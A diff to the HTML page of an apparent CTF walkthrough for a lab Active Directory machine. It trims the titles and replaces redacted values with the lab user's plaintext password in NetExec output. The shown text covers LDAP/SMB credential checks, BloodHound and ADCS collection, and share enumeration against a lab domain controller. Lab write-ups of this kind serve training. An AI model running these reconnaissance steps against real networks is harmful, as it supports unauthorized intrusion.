@@ -3,11 +3,11 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Welcome - ADCS ESC1 Certificate Attack | Zerotrace Logs</title>
+  <title>Welcome | Zerotrace Logs</title>
   <meta name="description" content="Complete walkthrough of Welcome machine from HackSmarter Labs. Learn ADCS ESC1 certificate exploitation, BloodHound attack path analysis, PDF cracking, and password spraying techniques." />
 
   <!-- Essential Open Graph tags for LinkedIn -->
-  <meta property="og:title" content="Welcome CTF Walkthrough - ADCS ESC1 Certificate Attack | Z3rotrace" />
+  <meta property="og:title" content="Welcome | Zerotrace Logs" />
   <meta property="og:description" content="Complete walkthrough covering Active Directory Certificate Services ESC1 exploitation, BloodHound analysis, PDF password cracking, and privilege escalation to Domain Admin." />
   <meta property="og:image" content="https://z3rotrace.live/assets/welcome/bloodhound-esc1-enrollment.png" />
   <meta property="og:url" content="https://z3rotrace.live/HackSmarter/welcome.html" />
@@ -15,7 +15,7 @@
 
   <!-- Twitter Card tags -->
   <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="Welcome CTF Walkthrough - ADCS ESC1 Certificate Attack | Z3rotrace" />
+  <meta name="twitter:title" content="Welcome | Zerotrace Logs" />
   <meta name="twitter:description" content="Complete walkthrough covering Active Directory Certificate Services ESC1 exploitation, BloodHound analysis, PDF password cracking, and privilege escalation to Domain Admin." />
   <meta name="twitter:image" content="https://z3rotrace.live/assets/welcome/bloodhound-esc1-enrollment.png" />
 
@@ -194,7 +194,7 @@
 <div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
 
 <section>
-  <h2>Welcome - ADCS ESC1 Certificate Attack</h2>
+  <h2>Welcome</h2>
   <p><em>Published: January 2026 | HackSmarter Labs</em></p>
 
   <div class="machine-info">
@@ -216,13 +216,13 @@
   <pre><code>$ nxc ldap 10.1.159.7 -u e.hills -p 'Il0vemyj0b2025!'</code></pre>
 
   <pre><code>LDAP        10.1.159.7      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:WELCOME.local) (signing:None) (channel binding:Never)
-LDAP        10.1.159.7      389    DC01             [+] WELCOME.local\e.hills:[REDACTED]</code></pre>
+LDAP        10.1.159.7      389    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025!</code></pre>
 
   <p>The credentials are valid. Next, I generated a hosts file for easier targeting:</p>
   <pre><code>$ nxc smb 10.1.159.7 -u e.hills -p 'Il0vemyj0b2025!' --generate-hosts-file host_file</code></pre>
 
   <pre><code>SMB         10.1.159.7      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.1.159.7      445    DC01             [+] WELCOME.local\e.hills:[REDACTED]</code></pre>
+SMB         10.1.159.7      445    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025!</code></pre>
 
   <p>Contents of the generated hosts file:</p>
   <pre><code>10.1.159.7     DC01.WELCOME.local WELCOME.local DC01</code></pre>
@@ -232,7 +232,7 @@ SMB         10.1.159.7      445    DC01             [+] WELCOME.local\e.hills:[R
   <pre><code>$ nxc ldap 10.1.159.7 -u e.hills -p 'Il0vemyj0b2025!' --bloodhound --collection All --dns-server 10.1.159.7</code></pre>
 
   <pre><code>LDAP        10.1.159.7      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:WELCOME.local) (signing:None) (channel binding:Never)
-LDAP        10.1.159.7      389    DC01             [+] WELCOME.local\e.hills:[REDACTED]
+LDAP        10.1.159.7      389    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025!
 LDAP        10.1.159.7      389    DC01             Resolved collection methods: rdp, acl, objectprops, dcom, localadmin, session, adcs, group, psremote, container, trusts
 LDAP        10.1.159.7      389    DC01             Done in 0M 27S
 LDAP        10.1.159.7      389    DC01             Collecting ADCS data (CertiHound)...
@@ -286,7 +286,7 @@ LDAP        10.1.159.7      389    DC01             Compressing output into /hom
   <pre><code>$ nxc smb 10.1.159.7 -u e.hills -p 'Il0vemyj0b2025!' --shares</code></pre>
 
   <pre><code>SMB         10.1.159.7      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.1.159.7      445    DC01             [+] WELCOME.local\e.hills:[REDACTED]
+SMB         10.1.159.7      445    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025!
 SMB         10.1.159.7      445    DC01             [*] Enumerated shares
 SMB         10.1.159.7      445    DC01             Share           Permissions     Remark
 SMB         10.1.159.7      445    DC01             -----           -----------     ------
